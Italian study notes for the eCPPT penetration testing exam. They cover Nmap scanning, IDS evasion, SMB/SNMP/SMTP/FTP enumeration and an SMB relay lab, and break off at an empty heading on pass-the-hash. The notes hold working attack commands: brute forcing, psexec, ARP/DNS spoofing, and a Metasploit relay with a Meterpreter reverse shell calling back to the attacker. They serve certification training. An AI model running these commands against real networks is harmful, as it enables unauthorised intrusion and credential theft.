---
title: "Network Penetration Testing — Studio Completo"
tags:
  - ad-enumeration
  - as-rep-roasting
  - asm
  - bloodhound
  - client-side
  - crackmapexec
  - credentials
  - hta
  - kerberoasting
  - kerberos
  - lateral-movement
  - linux-privesc
  - macro
  - metasploit
  - mimikatz
  - mssql
  - network
  - nmap
  - nse
  - ntlm
  - pass-the-hash
  - pass-the-ticket
  - persistence
  - phishing
  - pivoting
  - port-forwarding
  - rdp
  - regeorg
  - registers
  - scanning
  - silver-ticket
  - smb
  - smb-relay
  - snmp
  - socks
  - sudo
  - winrm
---
# Network Penetration Testing — Studio Completo

> **Modulo eCPPT (2024) · 26 video** · Istruttore Alexis Ahmed (HackerSploit / INE)
> Sintesi consolidata di tutti gli appunti del modulo. Per dettagli sul singolo video vedi i link in fondo.
> Esame eCPPT 2024 = **45 domande multiple choice** su ambiente lab pratico (no report).

---

## Indice

1. [Obiettivi & methodology](#1-obiettivi--methodology)
2. [Networking fundamentals (refresher)](#2-networking-fundamentals-refresher)
3. [Host discovery: tecniche e Nmap](#3-host-discovery-tecniche-e-nmap)
4. [Port scanning: tipi di scan](#4-port-scanning-tipi-di-scan)
5. [Service version & OS detection](#5-service-version--os-detection)
6. [Nmap Scripting Engine (NSE)](#6-nmap-scripting-engine-nse)
7. [Firewall detection & IDS evasion](#7-firewall-detection--ids-evasion)
8. [Optimization & timing](#8-optimization--timing)
9. [Output formats & Metasploit integration](#9-output-formats--metasploit-integration)
10. [Service enumeration](#10-service-enumeration)
11. [Attack labs](#11-attack-labs)
    - [SMB Relay (arpspoof + dnsspoof + smb_relay / ntlmrelayx)](#111-smb-relay-attack)
    - [MSSQL DB User Impersonation → RCE](#112-mssql-db-user-impersonation--rce)
    - [Linux Black-Box Pentest (eGallery → Exim → Shellshock)](#113-linux-black-box-pentest)
    - [NTLM hash dump & crack](#114-ntlm-hash-dump--crack)
    - [Windows Post-Exploitation Lab (Rejetto HFS → pivot → SSH)](#115-windows-post-exploitation-lab)
12. [Cheat sheet Nmap (master table)](#12-cheat-sheet-nmap-master-table)
13. [Cheat sheet Hashcat modes](#13-cheat-sheet-hashcat-modes)
14. [Porte di riferimento](#14-porte-di-riferimento)
15. [Punti d'attenzione per l'esame eCPPT](#15-punti-dattenzione-per-lesame-ecppt)

---

## 1. Obiettivi & methodology

Il modulo copre la **kill chain di rete** end-to-end suddivisa in 4 macro-aree:

1. **Host Discovery & Port Scanning** — Nmap, fondamentali TCP/IP.
2. **Service Enumeration** — SMB, NetBIOS, SNMP, SMTP, FTP, Finger, MSSQL.
3. **MITM / Network-based Attacks** — ARP/DNS spoofing, LLMNR/NBT-NS poisoning, SMB relay.
4. **Exploitation & Post-Exploitation** — Windows + Linux, hash dump/crack, pivoting.

### Penetration testing methodology (richiamo)

1. **Information Gathering** (passive → active)
2. **Enumeration** (separabile, fase a sé nel corso)
3. **Vulnerability Analysis & Threat Modeling** — lowest hanging fruit
4. **Exploitation**
5. **Post-Exploitation** — local enum → privesc → cred access → persistence → lateral movement → pivoting
6. **Reporting & Cleanup**

> Il processo è **ciclico**: dopo lateral movement si ricomincia da local enumeration sul nuovo host.

### Active vs Passive Information Gathering

| | Passive | Active |
|---|---|---|
| Interazione col target | No | Sì |
| Rumore in rete | Nullo | Alto/medio (log, IDS) |
| Esempi | WHOIS, DNS pubblico, OSINT, Google dorking, Shodan | Network mapping, port scan, service/OS detection, enumeration |
| Output | Domini, owner, persone, leak | Host attivi, porte aperte, servizi, versioni, OS |

**Enumeration è sempre active.** Genera log sul target → considerare timing lento + `-Pn` per stealth.

---

## 2. Networking fundamentals (refresher)

### OSI model (7 layer)

| # | Layer | Cosa fa | Protocolli/esempi |
|---|---|---|---|
| 1 | Physical | Mezzo fisico | USB, Ethernet, fibra, hub |
| 2 | Data Link | Framing, MAC, error detection locale | Ethernet, switch, ARP |
| 3 | **Network** | Logical addressing, routing | **IP, ICMP, IPsec** |
| 4 | **Transport** | End-to-end, flow control | **TCP, UDP** |
| 5 | Session | Sessioni tra app | NetBIOS, RPC |
| 6 | Presentation | Encryption, compression | SSL/TLS, SSH, JPEG |
| 7 | Application | Servizi di rete agli utenti | HTTP, FTP, DNS, SSH |

> Nmap opera principalmente a **L3 (ICMP, IP)** e **L4 (TCP, UDP)**; gli **NSE script** salgono a **L7**.

Mnemonica L1→L7: *Please Do Not Throw Sausage Pizza Away*.

### IPv4 header — campi rilevanti

| Campo | Bit | Note |
|---|---|---|
| Version | 4 | `4` per IPv4, `6` per IPv6 |
| IHL | 4 | Header length, min 5 (20 byte) |
| Total Length | 16 | Max 65 535 byte |
| Identification | 16 | Riassemblaggio fragment |
| Flags | 3 | reserved=0, **DF** (Don't Fragment), **MF** (More Fragments) |
| TTL | 8 | Decrementato di 1 ad ogni hop. Linux=64, Windows=128, networking=255 |
| **Protocol** | 8 | **1=ICMP · 6=TCP · 17=UDP** |
| Source / Dest Address | 32 + 32 | |

- **MTU** Ethernet = 1500 byte; pacchetti più grandi → fragmentation.
- IPv4 = **32 bit**, IPv6 = **128 bit** (esadecimale).
- ICMP echo request = type 8 / code 0; echo reply = type 0 / code 0; destination unreachable = type 3; time exceeded (traceroute) = type 11; timestamp = type 13; address mask = type 17.

### Transport layer — TCP vs UDP

| Aspetto | TCP | UDP |
|---|---|---|
| Connessione | Three-way handshake | Connectionless |
| Affidabilità | Reliable, retransmission | Unreliable |
| Ordine | Ordered | Out-of-order possibile |
| Header | Grande | Piccolo |
| Latency | Maggiore | Minore |
| Applicazioni | HTTP, SSH, SMTP, SMB | DNS, DHCP, SNMP, VoIP, streaming |

**Three-way handshake**:

| Step | Direzione | Flag | Note |
|---|---|---|---|
| 1 | Client → Server | **SYN** | ISN random |
| 2 | Server → Client | **SYN/ACK** | ACK=ISN_c+1 |
| 3 | Client → Server | **ACK** | ACK=ISN_s+1 — connessione stabilita |

Chiusura: **FIN** (graceful) o **RST** (abort).

**TCP flag**: URG, ACK, PSH, RST, SYN, FIN. Combinazioni illegali (es. FIN+PSH+URG = **Xmas**, no flag = **Null**) sono usate da Nmap per evadere firewall stateful.

### Port ranges

| Range | Tipo | Esempi |
|---|---|---|
| 0–1023 | **Well-known** (IANA) | 21 FTP, 22 SSH, 25 SMTP, 53 DNS, 80 HTTP, 443 HTTPS |
| 1024–49151 | **Registered** | 1433 MSSQL, 3306 MySQL, 3389 RDP, 5985 WinRM |
| 49152–65535 | **Dynamic / ephemeral** | Source port lato client |

Totale max = **65 535** porte.

---

## 3. Host discovery: tecniche e Nmap

### Sintassi base

```
nmap [SCAN_OPTIONS] [TARGET(S)] [PORT_OPTIONS] [SCRIPT_OPTIONS]
```

### Target specification

| Sintassi | Significato |
|---|---|
| `10.0.0.5` | Singolo IP |
| `10.0.0.5 10.0.0.7` | Più IP |
| `10.0.0.2-240` | Range ultimo ottetto |
| `10.0.0.0/24` | CIDR (256 IP) |
| `-iL targets.txt` | Lista da file |
| `--exclude <ip>` / `--excludefile <f>` | Escludi |

### Tecniche di discovery

| Tecnica | Flag Nmap | Quando | Note |
|---|---|---|---|
| ICMP echo (type 8) | `-PE` | Reti senza filtro | Bloccato da Windows Firewall di default |
| ICMP timestamp (type 13) | `-PP` | Bypass se `-PE` filtrato | |
| ICMP address mask (type 17) | `-PM` | Legacy, raramente utile | |
| **ARP request** | `-PR` | **LAN/stesso broadcast domain** | **Più affidabile in LAN**, bypassa firewall host |
| TCP SYN ping | `-PS<ports>` | Firewall blocca ICMP | Default port 80; preferibile lista (es. `22,80,443,3389`) |
| TCP ACK ping | `-PA<ports>` | Firewall stateless | RST in risposta = host vivo |
| UDP ping | `-PU<ports>` | Host che rispondono solo a UDP | Default port 40125 |
| IP protocol | `-PO<proto>` | Probe non standard | `-PO1` ICMP, `-PO2` IGMP |
| Skip discovery | `-Pn` | Host che blocca tutto | Tratta tutto come up → port scan |

### `-sn` Ping Scan — cosa fa davvero

Disabilita port scan. **Non è solo ICMP**: combina 4 probe per massimizzare l'accuratezza:

1. **ICMP echo request**
2. **TCP SYN → porta 443**
3. **TCP ACK → porta 80**
4. **ICMP timestamp request**

**Eccezione LAN**: su rete Ethernet locale Nmap usa **solo ARP** (override automatico). Per forzare probe IP-level anche in LAN: `--send-ip`.

### Differenza critica: `-sn` vs `-Pn`

- **`-sn`** = host discovery soltanto (skip port scan).
- **`-Pn`** = skip host discovery (passa direttamente al port scan, assume up).

Sono complementari, **mai sinonimi**: domanda ricorrente d'esame.

### Tool nativi pre-Nmap

| Comando | Scopo |
|---|---|
| `ping <ip>` / `ping -c 5 <ip>` (Linux) / `ping -n 5 <ip>` (Windows) | ICMP singolo |
| `fping <ip>` | Migliore di ping per scripting |
| `fping -a -g 10.0.0.0/24` | Sweep CIDR, `-a` solo alive, `-g` genera range |
| `fping -a -g 10.0.0.0/24 2>/dev/null` | Output pulito (silenzia unreachable) |
| `fping -S <ip>` | Spoof source IP (stealth) |
| `nbtscan 10.0.0.0/24` | NetBIOS sweep |
| `arp-scan -l` | ARP scan locale |

### Esempi pratici

```bash
sudo nmap -sn 10.0.0.0/24                       # ping scan (ICMP+SYN+ACK+ts; ARP in LAN)
sudo nmap -sn --send-ip 10.0.0.0/24             # forza probe L3 anche in LAN
sudo nmap -sn -PS22,80,443,3389 10.0.0.0/24     # SYN ping multi-porta
sudo nmap -sn -PA80,443 10.0.0.0/24             # ACK ping (bypass firewall stateless)
sudo nmap -sn -PU53,123,161 10.0.0.0/24         # UDP ping su servizi UDP comuni
sudo nmap -sn -PE -PP -PS21,22,80,443 -PA80 -PU161 10.0.0.0/24 --reason  # massima copertura
sudo nmap -Pn -sS -p- 10.0.0.5                  # skip discovery, host blocca tutto
sudo nmap -sn --traceroute 10.0.0.0/24          # discovery + path tracing
```

> **`--reason`** = colonna REASON con la causa (`syn-ack`, `reset`, `echo-reply`, `no-response`, `host-unreach`). Essenziale per debugging.

### Validazione con Wireshark

Filtri utili: `icmp`, `arp`, `tcp.flags.syn==1`. Permette di confermare che i probe siano stati effettivamente inviati e mostra il fallback automatico ad ARP in LAN.

---



### Quiz: Methodology, networking & host discovery

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="0"></div>

## 4. Port scanning: tipi di scan

### Default scan

```
nmap <target>
```

- **Privileged (root)** → **SYN scan (`-sS`)** (stealth, half-open).
- **Non-privileged** → **TCP Connect (`-sT`)** (completa handshake).
- Esegue **host discovery prima** del port scan (skippabile con `-Pn`).
- Scansiona **top 1000 porte** se non specificate.

### Tipi di scan

| Flag | Scan | Meccanica | Note |
|---|---|---|---|
| `-sS` | **SYN / Stealth / Half-open** | SYN → SYN/ACK → RST (no ACK) | **Default privileged**, raw socket, stealth |
| `-sT` | TCP Connect | SYN → SYN/ACK → ACK → RST | Default unprivileged, rumoroso (full handshake = log) |
| `-sU` | UDP | UDP → ICMP unreachable (closed) / app reply (open) / no reply (open\|filtered) | Lento, ambiguo |
| `-sA` | ACK | ACK isolato → RST = unfiltered; no reply = filtered | **Firewall detection** (non open/closed!) |
| `-sF` | FIN | Solo FIN | Bypass firewall stateful naïve |
| `-sN` | NULL | Nessun flag | Stesso scopo del FIN |
| `-sX` | Xmas | FIN+PSH+URG | "Albero di Natale" |
| `-sW` | Window | Variante ACK con analisi window size | |
| `-sM` | Maimon | FIN+ACK | |
| `-sY` | SCTP INIT | SCTP equiv di SYN | Raramente usato |
| `-sO` | IP Protocol | Scopre protocolli supportati a L3 | |
| `-sn` | Ping Scan | Solo host discovery | (vedi §3) |
| `-Pn` | Skip discovery | Salta probe iniziali | (vedi §3) |

### Stati delle porte (output Nmap)

| Stato | Significato |
|---|---|
| **open** | Servizio attivo che risponde |
| **closed** | Porta raggiungibile, nessun servizio |
| **filtered** | Firewall blocca → Nmap non sa |
| **open\|filtered** | Tipico UDP/probe ambigui |
| **unfiltered** | Raggiungibile, stato non determinato (es. ACK scan) |

> **Trick**: `filtered` su Windows ⇒ Windows Firewall attivo; `closed` ⇒ nessun firewall stateful in mezzo.

### Specifica porte (`-p`)

| Sintassi | Significato |
|---|---|
| `-p 80` | Singola |
| `-p 80,443,3389` | Lista |
| `-p 1-1000` | Range |
| `-p-` | Tutte le 65 535 TCP |
| `-p T:80,U:53` | Mix TCP/UDP |
| `-F` | Fast scan = top 100 |
| `--top-ports N` | Top N porte più comuni |

### Esempi

```bash
sudo nmap -Pn -sS -F <target>                   # default privileged + fast (100 porte)
sudo nmap -Pn -sS -p- -T4 <target>              # FULL TCP port scan
sudo nmap -Pn -sU -p 53,137,138,139,161 <t>     # UDP scan mirato
sudo nmap -Pn -sT -F <target>                   # connect scan (no root)
```

### Verifica con Wireshark

- **SYN scan**: SYN → SYN/ACK → **RST** (NO ACK).
- **Connect scan**: SYN → SYN/ACK → ACK → ACK/RST (full handshake).

### SYN vs Connect — differenza chiave

| | `-sS` SYN | `-sT` Connect |
|---|---|---|
| Privilegi | Root (raw socket) | Nessuno |
| Handshake | Half-open (no ACK) | Completo |
| Rumorosità | Bassa (no log applicativo) | Alta (3-way → log) |
| IDS detection | Più difficile | Facile |
| Velocità | Più veloce | Più lenta |

---

## 5. Service version & OS detection

### Flag chiave

| Flag | Scopo | Note |
|---|---|---|
| `-sV` | Service VERSION detection | Banner + probe da `nmap-service-probes` DB |
| `-O` | OS detection (TCP/IP fingerprinting) | Richiede root, idealmente 1 open + 1 closed |
| `-A` | **Aggressive** = `-sV -O -sC --traceroute` | Comodo ma rumoroso, NON include timing |
| `--osscan-guess` / `--fuzzy` | Forza guess aggressivo OS | Output con % di confidence |
| `--osscan-limit` | OS scan solo se 1 open + 1 closed | |
| `--version-intensity <0-9>` | Intensità sV (default 7) | 9 = max accuratezza, molto lento |
| `--version-light` | = intensity 2 | Veloce |
| `--version-all` | = intensity 9 | Massimo |

### Workflow tipico

```bash
ifconfig                                                 # determina propria interfaccia/subnet
sudo nmap -sn 192.31.2.0/24                              # trova host vivi
sudo nmap -sS 192.31.2.143                               # default → magari tutte chiuse
sudo nmap -sS -p- -T4 192.31.2.143                       # full TCP port scan
sudo nmap -sS -sV -p 6421,41288,55413 192.31.2.143       # service version
sudo nmap -sS -sV -O -p 6421,41288,55413 192.31.2.143    # + OS detection
sudo nmap -O --osscan-guess 192.31.2.143                 # forza guess
sudo nmap -sV --version-intensity 9 -O --osscan-guess 192.31.2.143
sudo nmap -A 192.31.2.143                                # one-shot aggressive
```

### Cosa rivela

- `-sV`: **versione esatta** del software (es. MongoDB 2.6.10, vsftpd 3.0.3, Postfix smtpd) → input diretto per CVE / `searchsploit`.
- `-O`: famiglia + versione OS (Windows Server 2012 R2, Ubuntu 14.04 kernel 3.x, ecc.).
- Banner **Service Info: OS: Unix** è un indizio gratuito da banner di servizio.

### Quando OS detection fallisce

NSE script protocol-specific (es. `mongodb-databases`, `smb-os-discovery`) possono rivelare distro + kernel quando `-O` non trova match.

---



### Quiz: Port scanning & fingerprinting

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="1"></div>

## 6. Nmap Scripting Engine (NSE)

### Concetti

- Framework in **Lua** integrato in Nmap, **>600 script** ufficiali.
- Path: **`/usr/share/nmap/scripts/`**.
- Trasforma Nmap da port scanner a tool di **enumeration + vuln assessment**.

### Categorie NSE

| Categoria | Significato |
|---|---|
| `auth` | Bypass / test auth |
| `broadcast` | Discovery via broadcast |
| `brute` | Brute force credenziali |
| **`default`** | Sicuri/informativi, invocati con `-sC` |
| **`discovery`** | Enumera info rete/host |
| `dos` | Denial of Service (pericoloso!) |
| **`exploit`** | Sfruttano vuln (pericoloso!) |
| `external` | Si appoggiano a servizi terzi |
| `fuzzer` | Test robustezza |
| `intrusive` | Possono crashare/saturare target |
| `malware` | Rilevano backdoor |
| `safe` | Garantiti sicuri |
| `version` | Aiutano `-sV` |
| **`vuln`** | Verificano CVE noti |

### Sintassi

```bash
nmap -sC <target>                              # = --script=default
nmap --script=<name> <target>                  # estensione .nse opzionale
nmap --script=<s1>,<s2> <target>               # multipli (virgola)
nmap --script="ftp-*" <target>                 # wildcard
nmap --script=<categoria> <target>             # per categoria
nmap --script="not intrusive" <target>         # esclusione
nmap --script-help=<name>                      # help script
nmap --script-args=<k>=<v>                     # argomenti
nmap --script-updatedb                         # aggiorna DB
```

### Script utili visti nel modulo

| Script | Scopo |
|---|---|
| `smb-protocols` | Enumera versioni SMB (rivela SMBv1!) |
| `smb-security-mode` | Auth level + signing |
| `smb-enum-users` / `smb-enum-shares` / `smb-enum-domains` | User/share/domain via SMB |
| `smb-vuln-*` | Vuln SMB (es. MS17-010 EternalBlue) |
| `smb-os-discovery` | OS via SMB |
| `nbstat` | NetBIOS name service |
| `snmp-brute` | Brute community string |
| `snmp-info` / `snmp-sysdescr` | System info |
| `snmp-win32-software` / `snmp-win32-services` / `snmp-win32-users` | Enum Windows via SNMP |
| `snmp-netstat` / `snmp-interfaces` / `snmp-processes` | Stato sistema |
| `smtp-commands` / `smtp-enum-users` / `smtp-open-relay` / `smtp-ntlm-info` | SMTP enum |
| `ftp-anon` / `ftp-brute` / `ftp-syst` / `ftp-* and vuln` | FTP |
| `mongodb-info` / `mongodb-databases` | MongoDB |
| `memcached-info` | Memcached |
| `ms-sql-info` / `ms-sql-brute` / `ms-sql-empty-password` / `ms-sql-xp-cmdshell` / `ms-sql-dump-hashes` / `ms-sql-ntlm-info` | MSSQL |
| `http-enum` | Web dir/title/banner |
| `vuln` (categoria) | CVE check |

---

## 7. Firewall detection & IDS evasion

### Firewall detection — ACK scan

```bash
sudo nmap -sA -p 445,3389 <target>
```

- `unfiltered` ⇒ nessun firewall stateful (lo stack TCP risponde con RST a un ACK fuori sessione).
- `filtered` ⇒ stateful firewall presente.

Non distingue open/closed!

### Tecniche di evasion

| Tecnica | Flag | Note |
|---|---|---|
| **Fragmentation** | `-f` (8 byte) / `-ff` (16 byte) | Frammenta probe a livello IP |
| **Custom MTU** | `--mtu <N>` | N multiplo di 8 |
| **Decoy** | `-D <ip1>,<ip2>,ME,<ip3>` | Mix con IP falsi (devono essere raggiungibili); `ME` = posizione propria |
| **Source port spoof** | `-g <port>` / `--source-port` | Es. `-g 53` (DNS), `80`, `88` (Kerberos) |
| **Data length** | `--data-length <N>` | N byte random appesi, cambia signature |
| **TTL custom** | `--ttl <N>` | OS-fingerprint evasion |
| **Bad checksum** | `--badsum` | Solo IDS naive |
| **No DNS** | `-n` | OPSEC + velocità |
| **Skip discovery** | `-Pn` | Vital contro host firewallati |
| **Slow timing** | `-T0`/`-T1` + `--scan-delay` | Vedi §8 |

### Esempio combinato (full stealth)

```bash
sudo nmap -Pn -n -sS -sV -p 445,3389 \
    -f --data-length 200 \
    -D 10.10.23.1,10.10.23.2,ME \
    -g 53 \
    -T1 --scan-delay 15s \
    <target>
```

> Le risposte tornano sempre al **vero IP dell'attaccante** (necessario per completare scan/handshake). I decoy confondono solo l'attribution lato log.

---

## 8. Optimization & timing

### Timing templates

| Template | Nickname | Uso tipico |
|---|---|---|
| `-T0` | Paranoid | IDS evasion estremo (~5 min tra probe) |
| `-T1` | Sneaky | IDS evasion (~15s tra probe) |
| `-T2` | Polite | Hardware fragile / non saturare target |
| `-T3` | Normal | **Default** Nmap |
| `-T4` | Aggressive | **Standard pen test** (reti veloci) |
| `-T5` | Insane | Max velocità, può perdere accuratezza |

Mnemonica: *Paranoid Sneaky Polite Normal Aggressive Insane*.

### Controlli fini

| Flag | Scopo |
|---|---|
| `--scan-delay <time>` | Delay fisso tra probe (`5s`, `15s`, `500ms`) |
| `--max-rate <N>` | Cap massimo pacchetti/sec |
| `--min-rate <N>` | Minimo pacchetti/sec |
| `--host-timeout <time>` | Abbandona host dopo X (`5s`, `30m`) |
| `--max-retries <N>` | Default 10 |

### Quando usare cosa

- **Pen test interno standard** → `-T4`.
- **Stealth con IDS** → `-T1` + `--scan-delay 15s` + `-D` + `-f`.
- **Scan grande Internet/CIDR** → `-T4 --host-timeout 30s`.
- **Network fragile/legacy** → `-T2`/`-T3`.

---



### Quiz: NSE, evasione firewall/IDS & timing

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="2"></div>

## 9. Output formats & Metasploit integration

### Formati

| Flag | Formato | Quando |
|---|---|---|
| `-oN <file>` | **Normal** (txt) | Report leggibile |
| `-oX <file>` | **XML** | Import in Metasploit |
| `-oG <file>` | **Grepable** | Pipeline shell |
| `-oS <file>` | ScriptKiddie | Raramente utile |
| `-oA <basename>` | **Tutti e 3** principali | Crea `.nmap`/`.xml`/`.gnmap` |

```bash
sudo nmap -Pn -sS -sV -F -T4 <target> -oA fullscan
```

### Workspaces Metasploit + import

```
sudo service postgresql start
msfconsole -q
msf6 > workspace -a clientX
msf6 > workspace clientX
msf6 > db_status
msf6 > db_import /root/fullscan.xml
msf6 > hosts
msf6 > services -p 445,3389
msf6 > db_nmap -Pn -sS -sV -O -p 445 <target>     # lancia nmap nativo, salva su DB
```

**Query DB**: `hosts`, `services`, `creds`, `loot`, `vulns`.

### Grepable parsing (esempio)

```bash
sudo nmap -Pn -p 22 <subnet>/24 -oG ssh.grep
egrep "22/open" ssh.grep | cut -d ' ' -f 2
```

### Verbosity / reason

- `-v` / `-vv` = più dettaglio a terminale.
- `--reason` = motivo classificazione porta.

> Per il report finale: SEMPRE formato **normal `.txt`**.

---

## 10. Service enumeration

Approccio **protocol-specific**: per ogni servizio aperto un tool dedicato + NSE.

### Cosa enumerare per protocollo

| Protocollo | Porte | Info da raccogliere |
|---|---|---|
| **NetBIOS** | UDP 137, 138 / TCP 139 | Hostname, workgroup, domain |
| **SMB** | TCP 445 (139 legacy) | Share, users, groups, version, signing |
| **SNMP** | UDP 161 (162 trap) | Community string, sysDescr, users, software, services, OID tree |
| **SMTP** | TCP 25 | User enum (VRFY/EXPN/RCPT), open relay, banner |
| **FTP** | TCP 21 | Anonymous, banner, vuln versione |
| **Finger** | TCP 79 | User enum su Linux legacy |
| **MSSQL** | TCP 1433 | Versione, login, ruoli (sysadmin), impersonation |
| **MySQL** | TCP 3306 | Versione, default creds |
| **RDP** | TCP 3389 | NLA, certificate, user enum (limited) |
| **HTTP/HTTPS** | TCP 80/443 | Tech stack, dir, vhost (modulo Web App) |

### 10.1 SMB & NetBIOS enumeration

#### Architettura

- **NetBIOS** = 3 servizi: Name (UDP 137), Datagram (UDP 138), Session (TCP 139, SMB over NetBIOS).
- **SMB direct** su TCP 445 (Win moderni).
- Su sistemi moderni si vede tipicamente **139 + 445 insieme** per backward compatibility.

#### Versioni SMB

| Versione | OS | Sicurezza |
|---|---|---|
| **SMBv1** | XP, 2003 | Insicuro (anonymous, null session, EternalBlue/MS17-010) |
| **SMBv2/2.1** | Vista, 2008 | Fix falle peggiori |
| **SMBv3+** | Win8, 2012+ | Encryption, signing, multichannel |

#### Workflow

```bash
# Discovery
sudo nmap -p 139,445 -sV --script "smb-protocols,smb-security-mode" <target>

# NetBIOS
nbtscan 10.10.23.0/24
nmblookup -A <target>
sudo nmap -sU -sV --script nbstat.nse -p 137 -Pn -n <target>

# Versione SMB & signing
sudo nmap -p 445 --script smb-protocols <target>           # rivela SMBv1
sudo nmap -p 445 --script smb-security-mode <target>       # message_signing: disabled/required

# Null session
smbclient -L //<target>/ -N                                # invio su password → se lista share, null session attiva
smbclient //<target>/<share> -N
smbmap -H <target>                                          # share + permessi (READ/WRITE/NO ACCESS)
smbmap -H <target> -u <user> -p <pass>                     # autenticato

# RPC null session
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumdomains
rpcclient $> querydominfo
rpcclient $> queryuser <RID>

# Enum one-shot
enum4linux -a <target>           # storico
enum4linux-ng -A <target>        # Python3, mantenuto

# NSE enum
sudo nmap -p 445 --script "smb-enum-users,smb-enum-shares,smb-enum-domains" <target>

# Brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target>

# RCE autenticato
impacket-psexec administrator@<target>                     # shell NT AUTHORITY\SYSTEM
# Oppure Metasploit
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target> ; set SMBUser administrator ; set SMBPass password1
msf6 > set PAYLOAD windows/x64/meter⁠preter/reverse_tcp
msf6 > exploit
```

### 10.2 SNMP enumeration (UDP 161)

#### Concetti

- **Manager / Agent / MIB**: il manager interroga l'agent, il MIB è un DB gerarchico di **OID**.
- **Community string** = "password" del protocollo (v1/v2c). Default da provare: **`public`**, **`private`**, **`secret`**.
- Versioni: **v1** (community plain), **v2c** (bulk + community plain), **v3** (auth user-based + encryption).

#### Workflow

```bash
sudo nmap -sU -p 161 <target>                              # SNMP è UDP!
sudo nmap -sU -sV -p 161 <target>                          # versione
sudo nmap -sU -p 161 --script snmp-brute <target>          # brute community
onesixtyone -c /usr/share/wordlists/snmp/community.txt <target>

# Walk MIB completo
snmpwalk -v1 -c public <target>
snmpwalk -v2c -c public <target>

# OID notevoli (Windows)
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.4.2.1.2     # processi
snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25      # utenti Windows
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.6.3.1.2     # software installato

# Tool comodi
snmp-check -c public -v 1 <target>                         # output formattato
sudo nmap -sU -p 161 --script "snmp-*" -oN snmp_full.txt <target>

# Read/write OID
snmpget -v1 -c public <target> <OID>
snmpset -v1 -c private <target> <OID> <type> <value>       # se private writable
```

**OID radici** importanti:
- `1.3.6.1.2.1` = MIB-2 standard
- `1.3.6.1.2.1.25` = Host Resources MIB
- `1.3.6.1.4.1.77` = LAN Manager (Windows)

**Output utile su Windows**: software installato, servizi Windows, user accounts, network interfaces, processes → **input per brute SMB/RDP**.

### 10.3 Linux service enumeration

#### SMTP (porta 25)

```bash
sudo nmap -sV -p 25 <target>
sudo nmap --script "smtp-commands,smtp-enum-users,smtp-open-relay" -p 25 <target>

# Tool dedicato (preferibile a NSE)
smtp-user-enum -M VRFY -U /usr/share/wordlists/common_users.txt -t <target>
# Metodi: VRFY (verifica), EXPN (espande alias), RCPT TO (fallback)
```

#### Samba (139/445)

Stessi tool di SMB Windows: `enum4linux`, `smbmap`, `smbclient`, `rpcclient`.

```bash
enum4linux -a <target> | grep "Local User"     # RID cycling
smbmap -H <target>
smbclient //<target>/public -N -c "recurse ON; ls"
```

#### Finger (porta 79)

```bash
sudo nmap -sV -p 79 <target>
finger root@<target>
./finger-user-enum.pl -U /usr/share/wordlists/unix_users.txt -t <target>

# Metasploit
msf6 > use auxiliary/scanner/finger/finger_users
```

#### FTP (porta 21)

```bash
sudo nmap -sV -p 21 <target>                          # banner → ProFTPD 1.3.3c?
searchsploit proftpd 1.3.3c                            # CVE-2010-4221 backdoor
sudo nmap -p 21 --script "ftp-* and vuln" <target>
sudo nmap -p 21 --script vuln <target>
sudo nmap -p 21 --script ftp-anon <target>
sudo nmap -p 21 --script ftp-brute <target>
ftp <target>                                           # user: anonymous · password: <invio>
```

#### Multi-target scan

```bash
echo -e "demo.ine.local\ndemo2.ine.local\ndemo3.ine.local\ndemo4.ine.local" > targets.txt
sudo nmap -sS -sV -T4 -iL targets.txt -oA multi_scan
```

---



### Quiz: Output Nmap e service enumeration (SMB/SNMP)

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="3"></div>

## 11. Attack labs

### 11.1 SMB Relay Attack

**Idea**: MITM su traffico SMB. L'attaccante intercetta la negoziazione NTLM del client e la **rilancia live** verso un altro SMB server autenticandosi al posto dell'utente. **Niente cracking** necessario.

**Pre-requisito critico**: **SMB signing disabled** (o `not required`) sul target. Default sui DC = `required`, ma molti file server hanno signing disabled.

**Catena**: `arpspoof` (bidirezionale) + `dnsspoof` → vittima parla SMB con noi → relay → Meterpreter su SMBHOST.

#### Topologia tipica (lab sportsfoo.com)

```
[Client Win7 172.16.5.5] ←→ [Gateway 172.16.5.1] ←→ [File Server 172.16.5.10]
              ↑
       [Kali 172.16.5.11]   ← attacker
```

#### Step-by-step (Metasploit classico)

```bash
# 1. Metasploit smb_relay
sudo msfconsole
msf6 > use exploit/windows/smb/smb_relay
msf6 > set PAYLOAD windows/meter⁠preter/reverse_tcp
msf6 > set SRVHOST  172.16.5.11      # IP Kali (rogue SMB)
msf6 > set LHOST    172.16.5.11      # callback meterpreter
msf6 > set SMBHOST  172.16.5.10      # target a cui rilanciare l'hash
msf6 > exploit -j

# 2. DNS spoof — reindirizza *.sportsfoo.com al Kali
echo "172.16.5.11 *.sportsfoo.com" > dns
sudo dnsspoof -i eth1 -f dns

# 3. IP forward
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 4. ARP spoof bidirezionale (2 terminali)
sudo arpspoof -i eth1 -t 172.16.5.5  172.16.5.1     # convince vittima che noi siamo gw
sudo arpspoof -i eth1 -t 172.16.5.1  172.16.5.5     # convince gw che noi siamo vittima

# 5. Aspetta trigger SMB (mapped drive, login script, Explorer su \\fileserver\share, WPAD)

# 6. Meterpreter su SMBHOST
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
```

#### Catena moderna (impacket + Responder)

```bash
# Disabilita SMB+HTTP in Responder per non collidere con relay
sudo nano /etc/responder/Responder.conf      # SMB = Off ; HTTP = Off

# ntlmrelayx con targets file
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Responder per catturare hash da LLMNR/NBT-NS
sudo responder -I eth0 -wd
# Modalità analyze (no poison): sudo responder -I eth1 -A

# Usa socks aperto da ntlmrelayx per accesso post-auth
proxychains impacket-smbexec administrator@<target>
```

#### Difese

- **SMB signing required** (server + client).
- **LDAP signing + channel binding**.
- **NTLM disabled** (forza Kerberos).
- **SMBv1 disabled**.
- Segmentazione di rete.

#### Differenza con Pass-the-Hash

